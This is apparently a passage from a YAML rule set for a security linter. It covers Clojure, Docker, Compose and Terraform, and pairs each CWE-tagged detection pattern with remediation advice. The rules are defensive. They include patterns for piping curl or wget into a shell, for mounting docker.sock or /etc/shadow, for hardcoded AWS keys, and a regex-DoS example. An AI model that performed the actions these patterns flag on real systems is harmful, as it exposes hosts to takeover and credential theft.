  clojure.spec or schema for input validation.\n\nGOOD: (s/def ::user-id (s/and string?\
  \ #(re-matches #\"\\\\d+\" %)))\n      (when (s/valid? ::user-id id) (db/get-user\
  \ (Long/parseLong id)))\n"
---
id: clojure-cwe-190-integer-overflow
language: clojure
severity: warning
message: 'CWE-190: Large numbers cause overflow or DoS conditions'
tags:
- security
- arithmetic
- CWE-190
rule:
  kind: arithmetic_operation
  pattern: arithmetic.*user.*input
note: 'Large numbers can cause overflow or DoS conditions. Validate numeric ranges.
  Use

  Math/addExact for overflow-safe arithmetic.

  '
---
id: clojure-cwe-1333-regex-dos
language: clojure
severity: warning
message: 'CWE-1333: Complex regex patterns have exponential complexity with crafted
  input'
tags:
- security
- regex-dos
- CWE-1333
rule:
  kind: regex_usage
  pattern: (a+)+|([^a]*)*(a|ab)*[cd]
note: 'Certain regex patterns have exponential complexity with crafted input. Avoid
  nested

  quantifiers. Use timeouts. Validate input length first.


  BAD:  (re-matches #"(a+)+$" user-input)

  GOOD: (re-matches #"a+$" user-input)

  '
---
id: clojure-cwe-611-xxe-xml-parsing
language: clojure
severity: warning
message: 'CWE-611: XXE allows reading local files, SSRF, and DoS'
tags:
- security
- xxe
- CWE-611
rule:
  kind: function_call
  pattern: (xml/parse.*input)
note: "XXE allows reading local files, SSRF, and DoS. Disable external entity processing\n\
  in XML parsers.\n\nGOOD: (let [factory (SAXParserFactory/newInstance)]\n       (.setFeature\
  \ factory \"http://xml.org/sax/features/external-general-entities\" false)\n   \
  \    (.setFeature factory \"http://xml.org/sax/features/external-parameter-entities\"\
  \ false)\n       (xml/parse input-stream :factory factory))\n"
---
id: clojure-cwe-502-yaml-deserialization
language: clojure
severity: warning
message: 'CWE-502: YAML can instantiate arbitrary objects - SnakeYAML defaults unsafe'
tags:
- security
- deserialization
- CWE-502
rule:
  kind: function_call
  pattern: (yaml/parse.*)
note: "YAML can instantiate arbitrary objects. SnakeYAML defaults are unsafe. Use\n\
  SafeConstructor or parse to primitive types only.\n\nGOOD: (let [yaml (Yaml. (SafeConstructor.))]\n\
  \       (.load yaml untrusted-yaml))\n"
---
id: clojure-cwe-362-race-condition-atom
language: clojure
severity: warning
message: 'CWE-362: Separate read and write on atoms creates race conditions'
tags:
- security
- concurrency
- CWE-362
rule:
  kind: atom_access
  pattern: '@.*reset!.*atom'
note: 'Separate read and write creates race conditions. Use swap! or compare-and-set!
  for

  atomic updates.


  BAD:  (when (< @counter limit) (reset! counter (inc @counter)))

  GOOD: (swap! counter (fn [c] (if (< c limit) (inc c) c)))

  '
---
id: clojure-cwe-362-shared-mutable-state
language: clojure
severity: warning
message: 'CWE-362: Shared mutable state without synchronization causes data races'
tags:
- security
- concurrency
- CWE-362
rule:
  kind: variable_assignment
  pattern: def.*(java.util.HashMap|java.util.ArrayList)
note: 'Shared mutable state without synchronization causes data races. Use atoms,
  refs, or

  agents. Prefer immutable data structures.


  BAD:  (def cache (java.util.HashMap.))

  GOOD: (def cache (atom {}))

  '
---
id: clojure-cwe-362-lazy-sequence-sharing
language: clojure
severity: info
message: 'CWE-362: Lazy sequences aren''t thread-safe during realization'
tags:
- security
- concurrency
- CWE-362
rule:
  kind: lazy_sequence_usage
  pattern: lazy.*threads
note: 'Lazy sequences aren''t thread-safe during realization. Realize sequences with
  doall

  before sharing across threads.

  '
---
id: clojure-cwe-1104-outdated-dependencies
language: clojure
severity: warning
message: 'CWE-1104: Outdated libraries may contain known vulnerabilities'
tags:
- security
- dependencies
- CWE-1104
- OWASP-Dependencies
rule:
  kind: dependency_usage
  pattern: dependency.*known.*CVE
note: 'Outdated libraries may contain known vulnerabilities. Regularly update dependencies.

  Use nvd-clojure or clj-watson for scanning.

  '
---
id: clojure-cwe-1104-dependency-confusion
language: clojure
severity: warning
message: 'CWE-1104: Internal library names confused with public packages'
tags:
- security
- dependencies
- CWE-1104
rule:
  kind: dependency_declaration
  pattern: internal.*library.*name
note: 'Attackers can publish malicious packages with internal names. Use unique prefixes

  for internal packages. Pin to specific repositories.

  '
---
id: clojure-cwe-1104-typosquatting-dependencies
language: clojure
severity: warning
message: 'CWE-1104: Typos in dependency names can pull malicious packages'
tags:
- security
- dependencies
- CWE-1104
rule:
  kind: dependency_declaration
  pattern: dependency.*similar.*popular
note: 'Typos in dependency names can pull malicious packages. Verify dependency names

  carefully. Use lock files.

  '
---
id: clojure-cwe-918-ssrf-http-client
language: clojure
severity: warning
message: 'CWE-918: Server-Side Request Forgery allows accessing internal services'
tags:
- security
- ssrf
- CWE-918
rule:
  kind: function_call
  pattern: (http/get.*user-url)
note: "Server-Side Request Forgery allows accessing internal services. Validate URLs\n\
  against allowlist. Block internal IP ranges.\n\nGOOD: (defn safe-url? [url]\n  \
  \     (let [host (.getHost (java.net.URL. url))]\n         (and (not (str/starts-with?\
  \ host \"10.\"))\n              (not (str/starts-with? host \"192.168.\"))\n   \
  \           (not (= host \"localhost\")))))\n"
---
id: clojure-cwe-295-disabled-ssl-verification
language: clojure
severity: warning
message: 'CWE-295: Disabling SSL verification enables man-in-the-middle attacks'
tags:
- security
- tls
- CWE-295
rule:
  kind: function_call
  pattern: :insecure\?.*true
note: 'Disabling SSL verification enables man-in-the-middle attacks. Always verify
  SSL

  certificates. Handle certificate issues properly.


  BAD:  (http/get url {:insecure? true})

  GOOD: (http/get url {:trust-store "path/to/truststore"})

  '
---
id: clojure-cwe-319-unencrypted-communication
language: clojure
severity: warning
message: 'CWE-319: HTTP traffic can be intercepted and modified'
tags:
- security
- cleartext-transmission
- CWE-319
rule:
  kind: url_usage
  pattern: http://
note: 'HTTP traffic can be intercepted and modified. Use HTTPS for all external

  communication.

  '
---
id: clojure-cwe-942-dns-rebinding
language: clojure
severity: warning
message: 'CWE-942: DNS rebinding attacks can bypass URL validation'
tags:
- security
- dns-rebinding
- CWE-942
rule:
  kind: network_request
  pattern: validate.*url.*then.*request
note: 'DNS rebinding attacks can bypass URL validation. Validate URL at request time.
  Use

  resolved IP for requests.

  '
---
id: clojure-cwe-95-macro-expanding-eval
language: clojure
severity: warning
message: 'CWE-95: Macros generating eval can be exploited if inputs aren''t validated'
tags:
- security
- code-injection
- CWE-95
rule:
  kind: macro_definition
  pattern: defmacro.*eval
note: 'Macros generating eval can be exploited if inputs aren''t validated. Avoid
  generating

  eval in macros. Use gensym for hygiene.

  '
---
id: clojure-cwe-95-macro-unquoted-input
language: clojure
severity: warning
message: 'CWE-95: Unquoted input in macros can inject arbitrary code'
tags:
- security
- code-injection
- CWE-95
rule:
  kind: macro_definition
  pattern: defmacro.*user.*input.*without.*quote
note: "Unquoted input can inject arbitrary code into macro expansion. Always use syntax-quote.\n\
  Validate inputs in macros.\n\nGOOD: (defmacro good-query [table]\n       `(query\
  \ ~(validate-table table)))\n"
---
id: clojure-cwe-400-symbol-capture-macros
language: clojure
severity: info
message: 'CWE-400: Symbol capture in macros can cause unexpected behavior'
tags:
- security
- macro-hygiene
- CWE-400
rule:
  kind: macro_definition
  pattern: defmacro.*(let|binding).*common.*name
note: "Symbol capture can cause unexpected behavior, potentially security issues.\
  \ Use gensym\nor auto-gensym (#) for local bindings in macros.\n\nGOOD: (defmacro\
  \ with-timing [& body]\n       `(let [result# ~@body]\n          (println \"Result:\"\
  \ result#)\n          result#))\n"
---
id: clojure-cwe-390-exception-swallowing
language: clojure
severity: warning
message: 'CWE-390: Swallowing exceptions can hide security failures'
tags:
- security
- error-handling
- CWE-390
rule:
  kind: exception_handler
  pattern: (catch.*Exception.*)
note: "Swallowing exceptions can hide security failures. Log exceptions. Rethrow or\
  \ handle\nappropriately.\n\nGOOD: (try (sensitive-operation)\n           (catch\
  \ Exception e\n             (log/error e \"Operation failed\")\n             (throw\
  \ (ex-info \"Operation failed\" {:original e}))))\n"
---
id: clojure-cwe-209-exception-messages-to-users
language: clojure
severity: warning
message: 'CWE-209: Exception details leak internal implementation information'
tags:
- security
- information-disclosure
- CWE-209
rule:
  kind: error_response
  pattern: .getMessage.*response
note: "Exception details can leak internal implementation information. Log details\n\
  internally. Return generic error messages to users.\n\nGOOD: (catch Exception e\n\
  \       (log/error e \"Request failed\")\n       {:status 500 :body \"An error occurred\"\
  })\n"
---
id: clojure-cwe-209-stack-trace-exposure
language: clojure
severity: warning
message: 'CWE-209: Stack traces reveal code structure, library versions, and paths'
tags:
- security
- information-disclosure
- CWE-209
rule:
  kind: error_response
  pattern: stack.*trace.*response
note: 'Stack traces reveal code structure, library versions, and file paths. Disable
  stack

  traces in production. Use custom error handlers.

  '
---
id: clojure-cwe-208-timing-attack-comparison
language: clojure
severity: warning
message: 'CWE-208: String comparison timing can leak information about correct value'
tags:
- security
- timing-attack
- CWE-208
rule:
  kind: comparison_operation
  pattern: (= .*token|= .*password)
note: 'String comparison timing can leak information. Use constant-time comparison
  for

  security-sensitive comparisons.


  GOOD: (MessageDigest/isEqual (.getBytes user-token) (.getBytes stored-token))

  '
---
id: clojure-cwe-862-missing-authorization
language: clojure
severity: warning
message: 'CWE-862: Missing authorization allows unauthorized access to resources'
tags:
- security
- authorization
- CWE-862
rule:
  kind: route_definition
  pattern: route.*without.*auth
note: 'Missing authorization allows unauthorized access to resources. Apply authorization

  middleware to all protected routes.

  '
---
id: clojure-cwe-639-broken-object-level-authorization
language: clojure
severity: warning
message: 'CWE-639: Users can access other users'' data by changing IDs'
tags:
- security
- authorization
- CWE-639
- OWASP-BOLA
rule:
  kind: resource_access
  pattern: get.*resource.*by.*id
note: "Users can access other users' data by changing IDs. Verify resource ownership\
  \ before\naccess.\n\nGOOD: (defn get-order [user-id order-id]\n       (let [order\
  \ (db/get-order order-id)]\n         (when (= (:user-id order) user-id) order)))\n"
---
id: clojure-cwe-347-jwt-no-validation
language: clojure
severity: error
message: 'CWE-347: JWTs without signature validation can be forged'
tags:
- security
- jwt
- CWE-347
rule:
  kind: function_call
  pattern: (jwt/.*parse|jwt/.*decode).*without.*verify
note: 'JWTs without signature validation can be forged. Always verify JWT signatures.

  Validate issuer and expiration.

  '
---
id: clojure-cwe-347-jwt-algorithm-confusion
language: clojure
severity: error
message: 'CWE-347: Accepting any algorithm in JWT enables algorithm switching attacks'
tags:
- security
- jwt
- CWE-347
rule:
  kind: function_call
  pattern: (jwt/.*verify).*any.*algorithm
note: '"alg: none" or algorithm switching attacks bypass verification. Specify expected

  algorithm explicitly. Reject "none" algorithm.

  '
---
id: clojure-custom-clj-kondo-security
language: clojure
severity: info
message: Configure clj-kondo for security warnings
tags:
- security
- linting
- clj-kondo
rule:
  kind: configuration
  pattern: .clj-kondo/config.edn
note: 'Configure clj-kondo to warn on dangerous patterns. Add security rules to

  .clj-kondo/config.edn for custom security analysis.

  '
---
id: docker-cwe-250-root-user
language: dockerfile
severity: error
message: 'CWE-250: Execution with Unnecessary Privileges (running as root)'
tags:
- security
- docker
- CWE-250
- OWASP-A01
rule:
  kind: dockerfile
  pattern: 'Dockerfile without USER directive or with USER root

    '
note: 'Containers running as root can escape to host with elevated privileges.

  If container is compromised, attacker gains root access.


  FIX: Create non-root user with low UID and switch to it:

  ```dockerfile

  RUN useradd -r -u 1001 appuser

  USER appuser

  ```

  References: CIS Docker Benchmark 4.1, OWASP Container Security

  '
---
id: docker-cwe-798-hardcoded-secrets
language: dockerfile
severity: error
message: 'CWE-798: Use of Hard-Coded Credentials (secrets in Dockerfile)'
tags:
- security
- docker
- CWE-798
- OWASP-A02
rule:
  kind: env_variable
  pattern: 'ENV (PASSWORD|KEY|SECRET|TOKEN)=.*

    ARG (AWS_SECRET|DATABASE_PASSWORD|JWT_SECRET)=.*

    RUN echo.*password

    '
note: 'Secrets in Dockerfiles are visible in image layers, build logs, and image history.

  Anyone with access to the image can extract credentials.


  FIX: Use Docker BuildKit secrets with --mount:

  ```dockerfile

  RUN --mount=type=secret,id=db_pass cat /run/secrets/db_pass

  ```

  Or use external secret managers (HashiCorp Vault, AWS Secrets Manager).

  References: CIS Docker 4.10, OWASP Secrets Management

  '
---
id: docker-cwe-345-insufficient-verification
language: dockerfile
severity: warning
message: 'CWE-345: Insufficient Verification of Data Authenticity (using mutable latest
  tag)'
tags:
- security
- docker
- CWE-345
rule:
  kind: from_instruction
  pattern: 'FROM image:latest

    FROM image (implicit latest)

    '
note: 'The ''latest'' tag is mutable and may introduce unexpected changes or vulnerabilities.

  An attacker could update the tag to point to a compromised image.


  FIX: Use specific version tags or SHA256 digests:

  ```dockerfile

  FROM python:3.11.4-slim-bookworm

  FROM node:20.5.0-alpine3.18@sha256:abc123...

  ```

  References: Docker Best Practices, CIS Docker 4.2

  '
---
id: docker-cwe-426-untrusted-search-path
language: dockerfile
severity: error
message: 'CWE-426: Untrusted Search Path (using EOL/unmaintained base images)'
tags:
- security
- docker
- CWE-426
rule:
  kind: from_instruction
  pattern: 'FROM debian:jessie

    FROM ubuntu:16.04

    FROM python:2.7

    FROM alpine:3.8

    FROM centos:7

    FROM node:12

    '
note: 'EOL images don''t receive security updates, leaving known vulnerabilities unpatched.

  Using outdated base images is a critical security risk.


  FIX: Use current LTS or supported versions:

  ```dockerfile

  FROM debian:bookworm-slim

  FROM ubuntu:22.04

  FROM python:3.11-slim

  FROM node:20-alpine

  ```

  References: NIST Container Guidelines, Distro EOL policies

  '
---
id: docker-cwe-345-missing-healthcheck
language: dockerfile
severity: warning
message: 'CWE-345: Insufficient Verification of Data Authenticity (missing health
  check)'
tags:
- security
- docker
- CWE-345
rule:
  kind: dockerfile
  pattern: 'Dockerfile without HEALTHCHECK instruction

    '
note: "Without health checks, orchestrators cannot detect unhealthy containers for\
  \ restart.\nContainers may become stalled without being detected.\n\nFIX: Add HEALTHCHECK\
  \ directive:\n```dockerfile\nHEALTHCHECK --interval=30s --timeout=3s --start-period=5s\
  \ --retries=3 \\\n  CMD curl -f http://localhost:8080/health || exit 1\n```\nReferences:\
  \ Docker Documentation, CIS Docker 4.6\n"
---
id: docker-cwe-250-privileged-container
language: yaml
severity: error
message: 'CWE-250: Execution with Unnecessary Privileges (privileged container)'
tags:
- security
- docker
- compose
- CWE-250
- OWASP-A01
rule:
  kind: compose_service
  pattern: 'privileged: true

    '
note: "Privileged containers have full access to host devices and kernel capabilities.\n\
  This enables container escape and complete host compromise.\n\nFIX: Use specific\
  \ capabilities instead:\n```yaml\ncap_add:\n  - NET_ADMIN\ncap_drop:\n  - ALL\n\
  ```\nReferences: CIS Docker 5.4, OWASP Container Security\n"
---
id: docker-cwe-942-permissive-network
language: yaml
severity: error
message: 'CWE-942: Permissive Network Configuration (host network mode)'
tags:
- security
- docker
- compose
- CWE-942
rule:
  kind: compose_service
  pattern: 'network_mode: host

    '
note: "Host network bypasses Docker network isolation, exposing container to host\
  \ network.\nAttacker can sniff host traffic and communicate with host services.\n\
  \nFIX: Use bridge networking with explicit port mappings:\n```yaml\nports:\n  -\
  \ \"8080:8080\"\n```\nReferences: CIS Docker 5.13\n"
---
id: docker-cwe-276-insufficient-access-control
language: yaml
severity: error
message: 'CWE-276: Incorrect Default Permissions (sensitive volume mounts)'
tags:
- security
- docker
- compose
- CWE-276
rule:
  kind: volume_mount
  pattern: '/:/host:rw

    /etc:/etc

    /var/run/docker.sock:/var/run/docker.sock

    /root:/root

    /etc/shadow:/etc/shadow

    '
note: "Mounting Docker socket allows container escape; system paths expose host configuration.\n\
  An attacker can use docker.sock to run privileged containers on the host.\n\nFIX:\
  \ Mount only required directories with minimal permissions:\n```yaml\nvolumes:\n\
  \  - ./data:/app/data:ro\n```\nReferences: CIS Docker 5.5, 5.6, 5.7\n"
---
id: docker-cwe-346-race-condition
language: dockerfile
severity: warning
message: 'CWE-346: Origin Validation Error (ADD with HTTP URLs)'
tags:
- security
- docker
- CWE-346
rule:
  kind: add_instruction
  pattern: 'ADD http.*

    ADD https.*

    '
note: "ADD with URLs doesn't verify content, susceptible to MITM attacks. No checksum\
  \ validation.\n\nFIX: Use curl/wget with checksum verification:\n```dockerfile\n\
  RUN curl -fsSL https://example.com/file.tar.gz -o /tmp/file.tar.gz \\\\\n    &&\
  \ echo \"expected_sha256  /tmp/file.tar.gz\" | sha256sum -c - \\\\\n    && tar -xzf\
  \ /tmp/file.tar.gz -C /app/\n```\nReferences: Hadolint DL3020, Docker Best Practices\n"
---
id: docker-cwe-200-exposed-ports
language: dockerfile
severity: warning
message: 'CWE-200: Exposure of Sensitive Information (exposed database ports)'
tags:
- security
- docker
- CWE-200
rule:
  kind: expose_instruction
  pattern: 'EXPOSE 22

    EXPOSE 23

    EXPOSE 3389

    EXPOSE 5432

    EXPOSE 3306

    EXPOSE 27017

    EXPOSE 6379

    '
note: 'Exposing database/admin ports increases attack surface.

  Databases should not be directly accessible from outside the container network.


  FIX: Only expose application ports; use internal networks for databases.

  Keep databases on default (non-exposed) internal docker networks.

  References: CIS Docker 5.14

  '
---
id: docker-cwe-665-improper-init
language: dockerfile
severity: info
message: 'CWE-665: Improper Initialization (PID 1 signal handling)'
tags:
- security
- docker
- CWE-665
rule:
  kind: dockerfile
  pattern: 'Running as PID 1 without init process

    '
note: 'Without init, zombie processes accumulate and signals aren''t handled properly.


  FIX: Use tini or dumb-init:

  ```dockerfile

  RUN apk add --no-cache tini

  ENTRYPOINT ["/sbin/tini", "--"]

  CMD ["node", "server.js"]

  ```

  References: Docker Best Practices, Kubernetes Pod Init

  '
---
id: docker-cwe-276-writable-rootfs
language: yaml
severity: warning
message: 'CWE-276: Incorrect Default Permissions (writable root filesystem)'
tags:
- security
- docker
- compose
- CWE-276
rule:
  kind: compose_service
  pattern: 'Missing read_only: true in container config

    '
note: "Writable rootfs allows attackers to modify binaries or install malware.\n\n\
  FIX: Set read-only filesystem and mount tmpfs for temp files:\n```yaml\nread_only:\
  \ true\ntmpfs:\n  - /tmp\n  - /var/run\n```\nReferences: CIS Docker 5.12\n"
---
id: docker-cwe-345-missing-seccomp
language: yaml
severity: warning
message: 'CWE-345: Insufficient Verification (missing seccomp/AppArmor)'
tags:
- security
- docker
- compose
- CWE-345
rule:
  kind: compose_service
  pattern: 'seccomp:unconfined

    apparmor:unconfined

    '
note: "Security profiles restrict syscalls and access patterns.\nUnconfined profiles\
  \ provide no protection against malicious syscalls.\n\nFIX: Use proper security\
  \ profiles:\n```yaml\nsecurity_opt:\n  - seccomp:./seccomp-profile.json\n  - apparmor:docker-default\n\
  ```\nReferences: CIS Docker 5.2, 5.3\n"
---
id: docker-cwe-250-sudo-usage
language: dockerfile
severity: warning
message: 'CWE-250: Execution with Unnecessary Privileges (sudo in RUN)'
tags:
- security
- docker
- CWE-250
rule:
  kind: run_instruction
  pattern: 'RUN sudo

    '
note: 'If running as non-root, sudo shouldn''t be needed. If running as root, sudo
  is redundant.

  Indicates improper container design.


  FIX: Design image to not require sudo; use proper USER directives.

  References: Hadolint DL3004

  '
---
id: docker-cwe-95-code-injection
language: dockerfile
severity: error
message: 'CWE-95: Improper Neutralization of Directives (curl to shell pipe)'
tags:
- security
- docker
- CWE-95
- OWASP-A03
rule:
  kind: run_instruction
  pattern: 'curl.*|.*sh

    curl.*|.*bash

    wget.*|.*sh

    wget.*|.*bash

    '
note: "Piping remote scripts directly to shell is dangerous - no integrity verification.\n\
  Attacker can intercept or replace the script.\n\nFIX: Download, verify, then execute:\n\
  ```dockerfile\nRUN curl -sSL https://example.com/install.sh -o /tmp/install.sh \\\
  \\\n    && echo \"sha256hash  /tmp/install.sh\" | sha256sum -c - \\\\\n    && chmod\
  \ +x /tmp/install.sh \\\\\n    && /tmp/install.sh\n```\nReferences: OWASP Supply\
  \ Chain Security\n"
---
id: docker-cwe-345-no-content-trust
language: dockerfile
severity: warning
message: 'CWE-345: Insufficient Verification of Data Authenticity (no content trust)'
tags:
- security
- docker
- CWE-345
rule:
  kind: from_instruction
  pattern: 'FROM image:tag (without digest)

    '
note: 'Without content trust, image integrity isn''t verified.

  An attacker can replace the image with a malicious version.


  FIX: Enable Docker Content Trust or use digest references:

  ```bash

  export DOCKER_CONTENT_TRUST=1

  ```

  ```dockerfile

  FROM nginx:1.24@sha256:abc123...

  ```

  References: Docker Content Trust Documentation

  '
---
id: docker-cwe-250-excessive-capabilities
language: yaml
severity: error
message: 'CWE-250: Execution with Unnecessary Privileges (excessive capabilities)'
tags:
- security
- docker
- compose
- CWE-250
rule:
  kind: capabilities_add
  pattern: 'SYS_ADMIN

    NET_ADMIN

    SYS_PTRACE

    cap_add: ALL

    '
note: "Excessive capabilities can be used for container escape.\nDangerous capabilities\
  \ should never be granted unless absolutely necessary.\n\nFIX: Drop all capabilities,\
  \ add only required ones:\n```yaml\ncap_drop:\n  - ALL\ncap_add:\n  - NET_BIND_SERVICE\n\
  ```\nReferences: CIS Docker 5.3, Linux Capabilities\n"
---
id: docker-cwe-269-improper-access-control
language: dockerfile
severity: warning
message: 'CWE-269: Improper Access Control (setuid/setgid binaries)'
tags:
- security
- docker
- CWE-269
rule:
  kind: dockerfile
  pattern: 'Absence of setuid removal command

    '
note: 'Setuid binaries can be exploited for privilege escalation.

  Containers should not contain unnecessary setuid/setgid binaries.


  FIX: Remove setuid/setgid bits:

  ```dockerfile

  RUN find / -perm /6000 -type f -exec chmod a-s {} \; 2>/dev/null || true

  ```

  References: CIS Docker 4.8

  '
---
id: terraform-cwe-798-hardcoded-credentials
language: hcl
severity: error
message: 'CWE-798: Use of Hard-Coded Credentials (AWS credentials in provider)'
tags:
- security
- terraform
- CWE-798
- OWASP-A02
rule:
  kind: provider_block
  pattern: 'access_key = "AKIA.*"

    secret_key = ".*"

    password = ".*"

    '
note: "Credentials in code are exposed in VCS, state files, and logs.\nAnyone with\
  \ access to the repository can extract AWS credentials.\n\nFIX: Use environment\
  \ variables, AWS profiles, or secrets managers:\n```hcl\nprovider \"aws\" {\n  region\
  \ = \"us-east-1\"\n  # Uses AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY env vars\n\
  }\n```\nReferences: tfsec AWS001, CIS AWS Benchmark\n"
---
id: terraform-cwe-276-permissive-iam
language: hcl
severity: error
message: 'CWE-276: Incorrect Default Permissions (overly permissive IAM)'
tags:
- security
- terraform
- CWE-276
- OWASP-A01
rule:
  kind: iam_policy
  pattern: 'Action = "*"

    Resource = "*"

    '
note: "Violates least privilege principle; compromised credentials have full access.\n\
  Any principal with this policy can perform ANY action on ANY resource.\n\nFIX: Specify\
  \ exact actions and resources needed:\n```hcl\nAction = [\"s3:GetObject\", \"s3:ListBucket\"\
  ]\nResource = [\n  \"arn:aws:s3:::my-bucket\",\n  \"arn:aws:s3:::my-bucket/*\"\n\
  ]\n```\nReferences: tfsec AWS099, AWS IAM Best Practices\n"
---
id: terraform-cwe-732-public-s3
language: hcl
severity: error
message: 'CWE-732: Incorrect Permission Assignment (public S3 bucket)'
tags:
- security
- terraform
- CWE-732
- OWASP-A01
rule:
  kind: resource
  pattern: 'acl = "public-read"

    block_public_acls = false

    block_public_policy = false

    '
note: 'Public buckets are a leading cause of data breaches.

  Any internet user can read, modify, or delete files in a public bucket.


  FIX: Block all public access:

  ```hcl

  block_public_acls = true

  block_public_policy = true

  ignore_public_acls = true

  restrict_public_buckets = true

  ```

  References: tfsec AWS001-AWS006, AWS S3 Security

  '
---
id: terraform-cwe-326-weak-encryption
language: hcl
severity: error
message: 'CWE-326: Inadequate Encryption Strength (unencrypted S3 bucket)'
tags:
- security
- terraform
- CWE-326
rule:
  kind: resource
  pattern: 'aws_s3_bucket without encryption

    '
note: "Data at rest should be encrypted for compliance and security.\nUnencrypted\
  \ data can be accessed if bucket is compromised or accessed directly.\n\nFIX: Enable\
  \ server-side encryption:\n```hcl\naws_s3_bucket_server_side_encryption_configuration\
  \ {\n  rule {\n    apply_server_side_encryption_by_default {\n      sse_algorithm\
  \ = \"aws:kms\"\n      kms_master_key_id = aws_kms_key.s3.arn\n    }\n  }\n}\n```\n\
  References: tfsec AWS017, AWS S3 Encryption\n"
---
id: terraform-cwe-326-unencrypted-rds
language: hcl
severity: error
message: 'CWE-326: Inadequate Encryption Strength (unencrypted RDS)'
tags:
- security
- terraform
- CWE-326
rule:
  kind: resource
  pattern: 'storage_encrypted = false

    '
note: 'Database storage should be encrypted at rest.

  Attackers with direct database access could read plaintext data.


  FIX: Enable encryption:

  ```hcl

  storage_encrypted = true

  kms_key_id = aws_kms_key.rds.arn

  ```

  References: tfsec AWS051, CIS AWS 2.3

  '
---
id: terraform-cwe-200-public-rds
language: hcl
severity: error
message: 'CWE-200: Exposure of Sensitive Information (publicly accessible RDS)'
tags:
- security
- terraform
- CWE-200
rule:
  kind: resource
  pattern: 'publicly_accessible = true

    '
note: 'Databases should never be directly accessible from the internet.

  This exposes the database to brute force and exploitation attacks.


  FIX: Keep databases private:

  ```hcl

  publicly_accessible = false

  db_subnet_group_name = aws_db_subnet_group.private.name

  ```

  References: tfsec AWS011, CIS AWS 2.3

  '
---
id: terraform-cwe-942-open-security-group
language: hcl
severity: error
message: 'CWE-942: Permissive Network Configuration (open security group)'
tags:
- security
- terraform
- CWE-942
rule:
  kind: ingress_rule
  pattern: 'cidr_blocks = ["0.0.0.0/0"]

    '
note: 'Open security groups expose services to the internet.

  Any internet user can attempt to connect to exposed ports.


  FIX: Restrict to specific IPs or security groups:

  ```hcl

  security_groups = [aws_security_group.bastion.id]

  ```

  References: tfsec AWS008-AWS009, CIS AWS 5.2

  '
---
id: terraform-cwe-778-missing-audit
language: hcl
severity: error
message: 'CWE-778: Insufficient Logging (missing CloudTrail)'
tags:
- security
- terraform
- CWE-778
rule:
  kind: resource
  pattern: 'Absence of aws_cloudtrail resource

    '
note: "CloudTrail provides audit logging for API calls.\nWithout CloudTrail, security\
  \ incidents cannot be investigated or detected.\n\nFIX: Enable CloudTrail:\n```hcl\n\
  aws_cloudtrail {\n  name = \"main-trail\"\n  s3_bucket_name = aws_s3_bucket.cloudtrail.id\n\
  \  include_global_service_events = true\n  is_multi_region_trail = true\n  enable_log_file_validation\
  \ = true\n}\n```\nReferences: tfsec AWS063, CIS AWS 3.1\n"
---
id: terraform-cwe-326-unencrypted-ebs
language: hcl
severity: error
message: 'CWE-326: Inadequate Encryption Strength (unencrypted EBS)'
tags:
- security
- terraform
- CWE-326
rule:
  kind: resource
  pattern: 'encrypted = false

    Missing encrypted property

    '
note: 'EBS volumes may contain sensitive data requiring encryption.

  Unencrypted volumes can be accessed if snapshot is exposed.


  FIX: Enable encryption:

  ```hcl

  encrypted = true

  kms_key_id = aws_kms_key.ebs.arn

  ```

  References: tfsec AWS026, CIS AWS 2.2.1

  '
---
id: terraform-cwe-778-missing-flowlogs
language: hcl
severity: warning
message: 'CWE-778: Insufficient Logging (missing VPC flow logs)'
tags:
- security
- terraform
- CWE-778
rule:
  kind: resource
  pattern: 'aws_vpc without aws_flow_log

    '
note: "Flow logs provide network traffic visibility for security monitoring.\nWithout\
  \ flow logs, network attacks cannot be detected.\n\nFIX: Enable VPC flow logs:\n\
  ```hcl\naws_flow_log {\n  iam_role_arn = aws_iam_role.flow_log.arn\n  log_destination\
  \ = aws_cloudwatch_log_group.flow_log.arn\n  traffic_type = \"ALL\"\n  vpc_id =\
  \ aws_vpc.main.id\n}\n```\nReferences: tfsec AWS071, CIS AWS 3.9\n"
---
id: terraform-cwe-326-unencrypted-elasticsearch
language: hcl
severity: error
message: 'CWE-326: Inadequate Encryption Strength (unencrypted Elasticsearch)'
tags:
- security
- terraform
- CWE-326
rule:
  kind: resource
  pattern: 'encrypt_at_rest.enabled = false

    '
note: "Elasticsearch may contain sensitive indexed data requiring encryption.\n\n\
  FIX: Enable encryption at rest:\n```hcl\nencrypt_at_rest {\n  enabled = true\n \
  \ kms_key_id = aws_kms_key.es.arn\n}\nnode_to_node_encryption {\n  enabled = true\n\
  }\n```\nReferences: tfsec AWS031, AWS Elasticsearch Security\n"
---
id: terraform-cwe-942-lambda-no-vpc
language: hcl
severity: warning
message: 'CWE-942: Permissive Network Configuration (Lambda without VPC)'
tags:
- security
- terraform
- CWE-942
rule:
  kind: resource
  pattern: 'aws_lambda_function without vpc_config

    '
note: "Lambda without VPC has public internet access; may expose sensitive operations.\n\
  \nFIX: Deploy Lambda in VPC:\n```hcl\nvpc_config {\n  subnet_ids = aws_subnet.private[*].id\n\
  \  security_group_ids = [aws_security_group.lambda.id]\n}\n```\nReferences: tfsec\
  \ AWS066, AWS Lambda Security\n"
---
id: terraform-cwe-326-kms-no-rotation
language: hcl
severity: warning
message: 'CWE-326: Inadequate Encryption Strength (KMS key without rotation)'
tags:
- security
- terraform
- CWE-326
rule:
  kind: resource
  pattern: 'enable_key_rotation = false

    Missing enable_key_rotation

    '
note: 'Regular key rotation limits exposure from compromised keys.


  FIX: Enable key rotation:

  ```hcl

  enable_key_rotation = true

  ```

  References: tfsec AWS019, CIS AWS 2.8

  '
---
id: terraform-cwe-345-ecr-no-scan
language: hcl
severity: warning
message: 'CWE-345: Insufficient Verification of Data Authenticity (ECR no scan)'
tags:
- security
- terraform
- CWE-345
rule:
  kind: resource
  pattern: 'scan_on_push = false

    '
note: "Scanning detects known vulnerabilities in container images.\n\nFIX: Enable\
  \ image scanning:\n```hcl\nimage_scanning_configuration {\n  scan_on_push = true\n\
  }\n```\nReferences: tfsec AWS023, AWS ECR Security\n"
---
id: terraform-cwe-778-alb-no-logs
language: hcl
severity: warning
message: 'CWE-778: Insufficient Logging (ALB without access logs)'
tags:
- security
- terraform
- CWE-778
rule:
  kind: resource
  pattern: 'aws_lb without access_logs

    '
note: "Access logs are essential for security monitoring and incident response.\n\n\
  FIX: Enable access logs:\n```hcl\naccess_logs {\n  bucket = aws_s3_bucket.alb_logs.bucket\n\
  \  enabled = true\n}\n```\nReferences: tfsec AWS005, AWS ELB Best Practices\n"
---
id: terraform-cwe-798-sensitive-state
language: hcl
severity: error
